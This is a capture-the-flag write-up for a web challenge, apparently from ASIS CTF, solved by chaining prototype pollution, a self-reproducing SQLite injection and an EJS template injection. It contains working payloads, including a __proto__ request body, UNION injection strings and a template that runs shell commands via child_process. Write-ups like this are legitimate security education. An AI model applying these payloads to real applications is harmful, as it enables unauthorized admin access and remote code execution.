
# Admin Panel

We are given an express app, with the flag inside the app.js file, so to solve it we need a LFI or RCE.
There are two routes `/upload` and `/admin` which allows us to upload custom `ejs` templates and render them respectively.
If we could do that, we could use the templating language for both RCE and LFI.

But to do that we need to become admin and therefore we need two things 

1. `req.session.isAdmin === true`
2. `req.session.user === 'admin`

Both are being set in `/login` route

```
if(typeof tmp.pw !== "undefined"){
            tmp.pw = tmp.pw.replace(/\\/gi,'').replace(/\'/gi,'').replace(/-/gi,'').replace(/#/gi,'');
}
        
```
Certain characters are removed in the password.

```
for(var key in tmp){
            user[key] = tmp[key];
        }
```
An object copy is made. This is an important part it will allow us to bypass certain restrictions.

```
if(req.connection.remoteAddress !== '::ffff:127.0.0.1' && tmp.id === 'admin' || typeof user.id === "undefined"){
            user.id = 'guest';
        }
req.session.user = user.id;
```

**The req.session.user** is directly set from the user input here as long as tmp.id !=='admin' when accessing the route remotely.

```
row = db.prepare(`select pw from users where id='admin' and pw='${user.pw}'`).get();
            if(typeof row !== "undefined"){
                console.log(row.pw);
                req.session.isAdmin = (row.pw === user.pw);
                console.log(req.session.isAdmin,req.session.user==='admin');
            }
```
The other admin condition is set here.

To set `req.session.isAdmin`, our password must be the same as the password returned from the sql login query.

We can clearly see **SQL injection** here but to break out of the `'` we need single quotes, which are restricted in the first code block above.


## Prototype pollution

To bypass this restriction and set req.session.user to `admin` we can use prototype pollution.
Express request parsing allows you to construct a customized object as per as you need.


```
{
	"__proto__":{"id":"admin", "pw": " '#~` "}
}
```

Sending this as the body in the POST request will do the following
1. tmp.pw will be undefined
2. When you copy the object properties, now user.pw will get our proto value
3. Similarly the tmp.id === 'admin' check will not return true as tmp.id is undefined, but user.id is not undefined


So now we have gotten **1/2 checks passed** to become an admin.

For the next one, we need to clear this condition `req.session.isAdmin = (row.pw === user.pw);`
To clear this our user.pw which will contain our sql injection payload should match the result of the sql query.

## SQL Injection

For this I thought I'll extract the admin's password and then just login through his password.

Blind injection techniques wouldn't work, there is no feedback. Sqlite does not have time related functions for time-based injection. 


But errors were being shown so I started looking for error payloads. While you can't extract data from error messages, you can use it to get feedback for blind extraction.
I found two error functions `json('x')` and `abs(-9223372036854775808)` to generate errors explicitly.

```
{
	"_proto_":{"pw":"' OR 1=1 and json('x')=id--","id":"admin"}
}
```
If the condition `1=1` is true our error will fire, otherwise no error.

But then I discovered that the users table is empty :/ So you can't extract a password, leaving with you only one option.

## Self Generating SQL query

The result of our SQL query should generate the entire injection payload. WTF!

To do that you obviously need some kind of repeat function. Sqlite doesn't have a straightforward function.
 
However you can use this ` replace(hex(zeroblob(X)),hex(zeroblob(1)),'string')` which will repeat 'string' X times.


```
Payload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')--
Generates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||
```

Also to escape single quotes I used `char(39)` and `||` to concat strings.

As you can see the generated string is just a double copy. Now to cleanly generate the last 4 characters as well

```
Payload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--
Generates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--
```

Now with this we can finally become admin

```
{
	"__proto__":{"pw":"' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--","id":"admin"}
}

```

Now we are only left with template injection which should be very easy.

## Template injection

We upload this payload

```
  <%- global.process.mainModule.require('child_process').execSync('cat app.js') %>

```
And use the `/admin?test=` route to render it.
This gets us the flag.

ASIS{t1me_t0_study_pr0t0type_p0llu7ion_4nd_ejs!}


